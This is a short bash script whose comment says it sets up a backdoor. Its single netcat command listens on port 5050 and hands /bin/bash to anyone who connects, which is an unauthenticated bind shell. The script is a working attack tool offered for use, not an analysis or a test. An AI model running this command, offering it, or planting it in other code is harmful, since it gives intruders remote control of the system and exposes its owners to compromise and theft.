#!/bin/bash

#setup a backdoor on system the script is ran on from another machine NC into the port you just opened and receive a shell!

nc -l -p 5050 -e /bin/bash